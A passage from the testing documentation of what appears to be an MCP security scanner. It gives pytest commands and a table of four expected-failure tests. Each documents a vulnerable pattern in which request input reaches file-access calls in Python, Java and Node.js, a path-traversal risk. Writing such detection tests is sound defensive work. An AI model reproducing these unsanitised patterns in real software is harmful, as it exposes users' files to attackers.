                 tests/unit/test_missing_auth.py \
                 tests/unit/test_tool_poisoning_enhanced.py -v

# With coverage report
python -m pytest tests/ --cov=src/mcp_sentinel --cov-report=term-missing

# Skip xfail tests
python -m pytest tests/ -p no:xfail
```

## xfail Tests (Expected Failures — Documented)

These four tests are intentionally marked `xfail`. They document detection patterns that require multi-line taint analysis — a capability beyond static regex matching. Tracked for v0.5.0.

| Test | Pattern | Why It Needs Semantic Analysis |
|---|---|---|
| `test_detect_open_with_request_param` | `x = request.args.get("f")` … `open(x)` | Variable assigned on line 1, used on line N |
| `test_detect_os_path_join_with_request` | `filename = request.args["f"]` … `os.path.join(base, filename)` | Cross-line def-use chain |
| `test_detect_java_file_constructor` | `String path = request.getParameter("f")` … `new File(path)` | Java taint tracking |
| `test_nodejs_file_handler` | `const f = req.query.file` … `fs.readFileSync(f)` | Node.js taint tracking |
